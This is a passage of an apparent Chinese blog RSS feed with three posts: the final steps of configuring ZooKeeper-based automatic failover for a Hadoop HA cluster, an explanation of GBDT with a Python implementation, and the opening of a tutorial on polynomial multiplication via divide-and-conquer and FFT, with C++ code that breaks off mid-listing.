&lt;p&gt;5.自动容灾配置&lt;/p&gt;
&lt;p&gt;需要引入zookeeper quarum 和 zk 容灾控制器(ZKFC)两个组件&lt;/p&gt;
&lt;p&gt;　　搭建zookeeper集群，选择s141，s142，s143三台机器，下载 zookeeper:&lt;a href=&quot;http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.5.6&quot;&gt;http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.5.6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　1) 解压zookeeper：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
tar -xzvf apache-zookeeper-&lt;span&gt;3.5&lt;/span&gt;.&lt;span&gt;6&lt;/span&gt;-bin.tar.gz -C /opt/soft/zookeeper-&lt;span&gt;3.5&lt;/span&gt;.&lt;span&gt;6&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　2) 配置环境变量，在/etc/profile中添加zk环境变量，并重新编译/etc/profile文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202225413721-1260714016.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
source /etc/profile
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3) 配置zk配置文件，三台机器配置文件统一&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# The number of milliseconds of each tick
tickTime&lt;/span&gt;=&lt;span&gt;2000&lt;/span&gt;&lt;span&gt;
# The number of ticks that the initial 
# synchronization phase can take
initLimit&lt;/span&gt;=&lt;span&gt;10&lt;/span&gt;&lt;span&gt;
# The number of ticks that can pass between 
# sending a request and getting an acknowledgement
syncLimit&lt;/span&gt;=&lt;span&gt;5&lt;/span&gt;&lt;span&gt;
# the directory &lt;/span&gt;&lt;span&gt;where&lt;/span&gt; the snapshot &lt;span&gt;is&lt;/span&gt;&lt;span&gt; stored.
# &lt;/span&gt;&lt;span&gt;do&lt;/span&gt; not use /tmp &lt;span&gt;for&lt;/span&gt; storage, /tmp here &lt;span&gt;is&lt;/span&gt;&lt;span&gt; just 
# example sakes.
dataDir&lt;/span&gt;=/home/hdfs/&lt;span&gt;zookeeper
# the port at which the clients will connect
clientPort&lt;/span&gt;=&lt;span&gt;2181&lt;/span&gt;&lt;span&gt;
# the maximum number of client connections.
# increase &lt;/span&gt;&lt;span&gt;this&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; you need to handle more clients
#maxClientCnxns&lt;/span&gt;=&lt;span&gt;60&lt;/span&gt;&lt;span&gt;
#
# Be sure to read the maintenance section of the 
# administrator guide before turning on autopurge.
#
# http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance&lt;/span&gt;
&lt;span&gt;#
# The number of snapshots to retain &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; dataDir
#autopurge.snapRetainCount&lt;/span&gt;=&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
# Purge task interval &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; hours
# Set to &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; to disable auto purge feature
#autopurge.purgeInterval&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
server.&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;=s141:&lt;span&gt;2888&lt;/span&gt;:&lt;span&gt;3888&lt;/span&gt;&lt;span&gt;
server.&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;=s142:&lt;span&gt;2888&lt;/span&gt;:&lt;span&gt;3888&lt;/span&gt;&lt;span&gt;
server.&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;=s143:&lt;span&gt;2888&lt;/span&gt;:&lt;span&gt;3888&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　4）分别&lt;/p&gt;
&lt;p&gt;　　　　在s141的/home/hdfs/zookeeper(在zoo.cfg配置文件中配置的dataDir路径)目录下创建myid文件，值为1（对应zoo.cfg配置文件中的server.1）&lt;/p&gt;
&lt;p&gt;　　　　在s142的/home/hdfs/zookeeper(在zoo.cfg配置文件中配置的dataDir路径)目录下创建myid文件，值为2（对应zoo.cfg配置文件中的server.2）&lt;/p&gt;
&lt;p&gt;　　　　在s143的/home/hdfs/zookeeper(在zoo.cfg配置文件中配置的dataDir路径)目录下创建myid文件，值为3（对应zoo.cfg配置文件中的server.3）&lt;/p&gt;
&lt;p&gt;　　5) 分别在每台机器上启动zk&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
zkServer.sh start
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　启动成功会出现zk进程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202230225994-137618553.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 配置hdfs相关配置：&lt;/p&gt;
&lt;p&gt;　　1）停止hdfs所有进程&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
stop-all.sh
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　2) 配置hdfs-site.xml，启用自动容灾.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&lt;/span&gt;&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.ha.automatic-failover.enabled&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;&lt;span&gt;true&lt;/span&gt;&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3) 配置core-site.xml，指定zk的连接地址.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;ha.zookeeper.quorum&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;s141:&lt;span&gt;2181&lt;/span&gt;,s142:&lt;span&gt;2181&lt;/span&gt;,s143:&lt;span&gt;2181&lt;/span&gt;&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　4) 分发以上两个文件到所有节点。&lt;/p&gt;
&lt;p&gt;　　5) 在其中的一台NN(s141),在ZK中初始化HA状态&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
hdfs zkfc -formatZK
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　出现如下结果说明成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202231635368-243684138.png&quot; alt=&quot;&quot; width=&quot;1075&quot; height=&quot;287&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　也可去zk中查看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202231929251-1248319153.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　6) 启动hdfs集群&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
start-dfs.sh
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看各个机器进程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202232252637-2011233621.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 启动成功，再看一下webui&lt;/p&gt;
&lt;p&gt;　　s146为激活态&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202232402293-389580978.png&quot; alt=&quot;&quot; width=&quot;878&quot; height=&quot;219&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　s141为待命态&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202232446605-205566779.png&quot; alt=&quot;&quot; width=&quot;878&quot; height=&quot;201&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 至此hadoop 自动容灾HA搭建完成&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 15:31:00 +0000</pubDate>
<dc:creator>七星6609</dc:creator>
<og:description>本篇介绍在centos7中搭建hadoop2.10高可用集群，首先准备6台机器：2台nn(namenode);4台dn(datanode)；3台jns(journalnodes) IP hostnam</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/qixing/p/12252111.html</dc:identifier>
</item>
<item>
<title>谈谈模型融合之三 —— GBDT - ITryagain</title>
<link>http://www.cnblogs.com/csu-lmw/p/12254174.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/csu-lmw/p/12254174.html</guid>
<description>&lt;p&gt;本来应该是年后就要写的一篇博客，因为考完试后忙了一段时间课设和实验，然后回家后又在摸鱼，就一直没开动。趁着这段时间只能呆在家里来把这些博客补上。在之前的文章中介绍了 Random Forest 和 AdaBoost，这篇文章将介绍介绍在数据挖掘竞赛中，最常用的算法之一 —— GBDT（Gradient Boosting Decision Tree）。&lt;/p&gt;

&lt;h2 id=&quot;原理&quot;&gt;原理&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;GBDT&lt;/code&gt; 实际上是 &lt;code&gt;GBM（Gradient Boosting Machine）&lt;/code&gt; 中的一种，采用 CART 树作为基学习器，所以称为 GBDT。与 AdaBoost 一样，GBDT 为 Boosting 家族中的一员。其表达式为&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ f_m(x) = \sum_{m=1}^{M} T(x;\Theta_m) \]&lt;/span&gt;&lt;br/&gt;其中&lt;span class=&quot;math inline&quot;&gt;\(T(x;\Theta_m)\)&lt;/span&gt;表示决策树；&lt;span class=&quot;math inline&quot;&gt;\(\Theta_m\)&lt;/span&gt;为决策树参数；M为树的个数。&lt;/p&gt;
&lt;p&gt;这里来回顾下 AdaBoost，AdaBoost 通过不断调整样本权重，使得上一次分类错误的样本权重变大，最后训练出 m 个弱分类器，然后对 m 个弱分类器加权结合形成强分类器。&lt;/p&gt;
&lt;p&gt;而 GBDT 又是另一思想，当我们假设前一轮迭代得到的学习器为 &lt;span class=&quot;math inline&quot;&gt;\(f_{m-1}(x)\)&lt;/span&gt; ，损失函数为 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_{m-1}(x))\)&lt;/span&gt; ，那么，本轮迭代的目标就是使损失函数 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_{m-1}(x) + h_m(x))\)&lt;/span&gt; 的值尽可能的小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们先将损失函数假设为最常用的平方损失&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;令 &lt;span class=&quot;math inline&quot;&gt;\(r = y - f_{m-1}(x)\)&lt;/span&gt; ，那么第 m 步的目标就是最小化 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_m(x)) = \frac{1}{2}(y-f_m(x))^2=\frac{1}{2}(r-h_m(x))^2\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;到这里，似乎发现了点什么，我们对损失函数求导，发现：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \frac{\partial{L}}{\partial{h_m(x)}}=h_m(x)-r \]&lt;/span&gt;&lt;br/&gt;看出什么来了没？对其取个负号就变成 &lt;span class=&quot;math inline&quot;&gt;\(r-h_m(x)\)&lt;/span&gt; ，即我们常说的&lt;code&gt;残差&lt;/code&gt; ，所以，&lt;strong&gt;当为平方损失函数时，弱学习器拟合的目标为之前拟合结果的残差&lt;/strong&gt;。那到这里代码就很好写了，但是，我们实际中有很多其它的损失函数，而且在很多问题中，这些损失函数比平方损失要好得多。那这时候，如果我们还采用同样的思路，那就没办法像上面那样直接展开并拟合残差了，这时候该怎么办？&lt;/p&gt;
&lt;p&gt;这里别忘了，我们最终的目标是使得 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_m(x))\)&lt;/span&gt; 最小，那么只需要保证 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_{m-1}(x)+h_m(x))\)&lt;/span&gt; 的值比 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_{m-1}(x))\)&lt;/span&gt; 小就好了。&lt;/p&gt;
&lt;p&gt;即&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ max[L(y,f_{m-1}(x))-L(y,f_{m-1}(x)+h(x))] \]&lt;/span&gt;&lt;br/&gt;&lt;del&gt;检验大一高数学的怎么样的时候到了 orz&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;我们前面说了第 m 轮迭代的损失函数为 &lt;span class=&quot;math inline&quot;&gt;\(L(y, f_{m-1}(x) + h_m(x))\)&lt;/span&gt; ，换一种形式，写成 &lt;span class=&quot;math inline&quot;&gt;\(L(f_{m-1}(x) + h_m(x))\)&lt;/span&gt; ，对其进行一阶泰勒展开，得&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ L(f_{m-1}(x)+h_m(x)) \approx L(f_{m-1}(x)) + L'(f_{m-1}(x))h_m(x) \]&lt;/span&gt;&lt;br/&gt;所以，我们只需使得满足&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \max L'(f_{m-1}(x))h_m(x) \\ L'(f_{m-1}(x))h_m(x)&amp;lt;0 \]&lt;/span&gt;&lt;br/&gt;那我们的 &lt;span class=&quot;math inline&quot;&gt;\(h_m(x)\)&lt;/span&gt; 到底要拟合什么呢？别忘了，我们是要求梯度的，在这里我们已知的是 &lt;span class=&quot;math inline&quot;&gt;\(L'(f_{m-1}(x))\)&lt;/span&gt; ，我们肯定是根据上一次的拟合的结果来拟合这一次的结果，所以，要使得结果最大，自然就是梯度方向。那么 &lt;span class=&quot;math inline&quot;&gt;\(h_m(x)=-L'(f_{m-1}(x))\)&lt;/span&gt; ， 这样原先的 &lt;span class=&quot;math inline&quot;&gt;\(r\)&lt;/span&gt; 也就变成了梯度。这里如果把损失函数看作是平方损失，我们得到的结果也恰好就是我们所说的残差！！&lt;/p&gt;
&lt;p&gt;&lt;em&gt;此时也总算明白了之前面腾讯的时候我说 GBDT 是拟合残差的时候面试官让我再回去重新康康这个算法的原因了。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;算法步骤&quot;&gt;算法步骤&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;输入&lt;/strong&gt;: 训练数据集 &lt;span class=&quot;math inline&quot;&gt;\(T = {(x_1, y_1),(x_2, y_2), ..., (x_N, y_N)}, x_i \in X \subset R^n, y_i \in Y \subset R\)&lt;/span&gt;; 损失函数 L(y,f(x)),树的个数M.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;输出&lt;/strong&gt;: 梯度提升树&lt;span class=&quot;math inline&quot;&gt;\(F_M(x)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;(1) 初始化 &lt;span class=&quot;math inline&quot;&gt;\(f_0(x) = argmin_c \Sigma_{i=1}^N L(y_i,c)\)&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;(2) 对 &lt;span class=&quot;math inline&quot;&gt;\(m=1,2,...,M\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;​ (a) 对&lt;span class=&quot;math inline&quot;&gt;\(i =1,2,...,N\)&lt;/span&gt;,计算, &lt;span class=&quot;math inline&quot;&gt;\(r_{mi} = - [\frac{\partial L(y_i, f(x_i))}{\partial f(x_i)}]_{f(x) = F_{m-1}(x)}\)&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;​ (b) 拟合残差&lt;span class=&quot;math inline&quot;&gt;\(r_{mi}\)&lt;/span&gt;学习一个回归树,得到&lt;span class=&quot;math inline&quot;&gt;\(f_m(x)\)&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;​ (c) 更新&lt;span class=&quot;math inline&quot;&gt;\(F_m(x) = F_{m-1}(x) + f_m(x)\)&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;(3) 得到回归问题提升树 &lt;span class=&quot;math inline&quot;&gt;\(F_M(x) = \Sigma_{i=0}^M f_i(x)\)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;代码&quot;&gt;代码&lt;/h2&gt;
&lt;p&gt;这里代码是采用了平方损失的方法来写的，且解决的是分类问题&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def sigmoid(x):
    &quot;&quot;&quot;
    计算sigmoid函数值
    &quot;&quot;&quot;
    return 1 / (1 + np.exp(-x))


def gbdt_classifier(X, y, M, max_depth=None):
    &quot;&quot;&quot;
    用于分类的GBDT函数
    参数:
        X: 训练样本
        y: 样本标签，y = {0, +1}
        M: 使用M个回归树
        max_depth: 基学习器CART决策树的最大深度
    返回:
        F: 生成的模型
    &quot;&quot;&quot;
    # 用0初始化y_reg
    y_reg = np.zeros(len(y))
    f = []
    
    for m in range(M):
        # 计算r
        r = y - sigmoid(y_reg)
        
        # 拟合r
        # 使用DecisionTreeRegressor，设置树深度为5，random_state=0
        f_m = DecisionTreeRegressor(max_depth=5, random_state=0)
        # 开始训练
        f_m.fit(X, r)
        # 更新f
        f.append(f_m)
        
        y_reg += f_m.predict(X)
    
    def F(X):
        num_X, _ = X.shape
        reg = np.zeros((num_X))
        
        for t in f:
            reg += t.predict(X)
        
        y_pred_gbdt = sigmoid(reg)
        
        # 以0.5为阈值，得到最终分类结果0或1
        one_position = y_pred_gbdt &amp;gt;= 0.5
        y_pred_gbdt[one_position] = 1
        y_pred_gbdt[~one_position] = 0
        
        return y_pred_gbdt
    
    return F&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;到这里 GBDT 也就讲完了，从决策树 ID3 开始一直到 GBDT，后面终于要迎来最开始想要梳理的数据挖掘的两大杀器 XGBoost 和 LightGBM 了，下一篇将介绍 XGBoost。&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 14:54:00 +0000</pubDate>
<dc:creator>ITryagain</dc:creator>
<og:description>前言 本来应该是年后就要写的一篇博客，因为考完试后忙了一段时间课设和实验，然后回家后又在摸鱼，就一直没开动。趁着这段时间只能呆在家里来把这些博客补上。在之前的文章中介绍了 Random Forest</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/csu-lmw/p/12254174.html</dc:identifier>
</item>
<item>
<title>Algorithm: 多项式乘法  Polynomial Multiplication: 快速傅里叶变换 FFT / 快速数论变换 NTT - BrianPeng</title>
<link>http://www.cnblogs.com/BrianPeng/p/12251447.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/BrianPeng/p/12251447.html</guid>
<description>&lt;h3 id=&quot;intro&quot;&gt;Intro:&lt;/h3&gt;
&lt;p&gt;本篇博客将会从朴素乘法讲起，经过分治乘法，到达FFT和NTT&lt;/p&gt;
&lt;p&gt;旨在能够让读者（也让自己）充分理解其思想&lt;/p&gt;
&lt;p&gt;模板题入口：&lt;a href=&quot;https://www.luogu.com.cn/problem/P3803&quot;&gt;洛谷 P3803 【模板】多项式乘法（FFT）&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;朴素乘法&quot;&gt;朴素乘法&lt;/h2&gt;
&lt;h4 id=&quot;约定两个多项式为axsum_i0na_ixibxsum_i0mb_ixi&quot;&gt;约定：两个多项式为&lt;span class=&quot;math inline&quot;&gt;\(A(x)=\sum_{i=0}^{n}a_ix^i,B(x)=\sum_{i=0}^{m}b_ix^i\)&lt;/span&gt;&lt;/h4&gt;
&lt;h3 id=&quot;prerequisite-knowledge&quot;&gt;Prerequisite knowledge:&lt;/h3&gt;
&lt;p&gt;初中数学知识&lt;del&gt;（手动滑稽）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;最简单的多项式方法就是逐项相乘再合并同类项，写成公式：&lt;/p&gt;
&lt;p&gt;若&lt;span class=&quot;math inline&quot;&gt;\(C(x)=A(x)B(x)\)&lt;/span&gt;，那么&lt;span class=&quot;math inline&quot;&gt;\(C(x)=\sum_{i=0}^{n+m}c_ix^i\)&lt;/span&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(c_i=\sum_{j=0}^ia_jb_{i-j}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;于是一个朴素乘法就产生了，见代码（利用某种丧心病狂的方式省了&lt;span class=&quot;math inline&quot;&gt;\(b\)&lt;/span&gt;数组）&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int x;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,x=c&amp;amp;15;else k=x=0;
    while(isdigit(Gc(c)))x=(x&amp;lt;&amp;lt;1)+(x&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?x:-x;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
#define N (2000010)
int n,m,a[N],b,c[N];
signed main(){
    Rd(n),Rd(m);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m){Rd(b);Frn1(j,0,n)c[i+j]+=b*a[j];}
    Frn1(i,0,n+m)wr(c[i]),Ps;
    exit(0);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Time complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(nm)\)&lt;/span&gt;，如果&lt;span class=&quot;math inline&quot;&gt;\(m=O(n)\)&lt;/span&gt;，则为&lt;span class=&quot;math inline&quot;&gt;\(O(n^2)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202024540%E6%9C%B4%E7%B4%A0%E4%B9%98%E6%B3%95.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;意料之中&lt;/del&gt;，所以必须优化&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;朴素分治乘法&quot;&gt;朴素分治乘法&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;P.s 这一部分讲述了FFT的分治方法，与FFT还是有区别的，如果已经理解的可以跳过&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;约定n为同时属于axbx次数界的最小的2的正整数幂并将两个多项式设为axsum_i0n-1a_ixibxsum_i0n-1b_ixi不存在的系数补零&quot;&gt;约定：&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;为同时属于&lt;span class=&quot;math inline&quot;&gt;\(A(x),B(x)\)&lt;/span&gt;次数界的最小的&lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt;的正整数幂，并将两个多项式设为&lt;span class=&quot;math inline&quot;&gt;\(A(x)=\sum_{i=0}^{n-1}a_ix^i,B(x)=\sum_{i=0}^{n-1}b_ix^i\)&lt;/span&gt;，不存在的系数补零&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;次数界&lt;/strong&gt;：严格&lt;span class=&quot;math inline&quot;&gt;\(&amp;gt;\)&lt;/span&gt;一个多项式次数的整数（E.g 多项式&lt;span class=&quot;math inline&quot;&gt;\(P(x)=x^2+x+1\)&lt;/span&gt;的次数界为&lt;span class=&quot;math inline&quot;&gt;\(\geqslant3\)&lt;/span&gt;的所有整数）&lt;/p&gt;
&lt;h3 id=&quot;reference&quot;&gt;Reference：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;《算法导论》&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;prerequisite-knowledge-1&quot;&gt;Prerequisite knowledge:&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;分治思想&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在来考虑如何去优化乘法&lt;/p&gt;
&lt;p&gt;尝试将两个多项式按照未知项次数的奇偶性分开：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(A(x)=A^{[0]}(x^2)+xA^{[1]}(x^2),B(x)=B^{[0]}(x^2)+xB^{[1]}(x^2)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x)=\sum_{i=0}^{n/2-1}a_{2i}x^i,A^{[1]}(x)=\sum_{i=0}^{n/2-1}a_{2i+1}x^i\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(B^{[0]}(x)\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\(B^{[1]}(x)\)&lt;/span&gt;同理&lt;/p&gt;
&lt;p&gt;于是两个多项式就被拆成了两个次数界为&lt;span class=&quot;math inline&quot;&gt;\(n/2\)&lt;/span&gt;的四个多项式啦：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;P.s 以下的公式中，用&lt;span class=&quot;math inline&quot;&gt;\(A\)&lt;/span&gt;表示&lt;span class=&quot;math inline&quot;&gt;\(A(x)\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}\)&lt;/span&gt;分别表示&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x^2)\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}(x^2)\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(B\)&lt;/span&gt;同理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(AB=(A^{[0]}+xA^{[1]})(B^{[0]}+xB^{[1]})=A^{[0]}B^{[0]}+x(A^{[1]}B^{[0]}+A^{[0]}B^{[1]})+x^2A^{[1]}B^{[1]}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在此可以发现一种分治算法：把两个多项式折半，然后再递归算&lt;span class=&quot;math inline&quot;&gt;\(4\)&lt;/span&gt;次多项式乘法，最后合并加起来&lt;/strong&gt;（反正多项式加法是&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;的）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;P.s 注意合并方式：&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}\)&lt;/span&gt;分别表示&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x^2)\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}(x^2)\)&lt;/span&gt;，所以是交错的&lt;/strong&gt;，见代码&lt;/p&gt;
&lt;p&gt;（为了省空间用了vector）&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int x;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,x=c&amp;amp;15;else k=x=0;
    while(isdigit(Gc(c)))x=(x&amp;lt;&amp;lt;1)+(x&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?x:-x;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
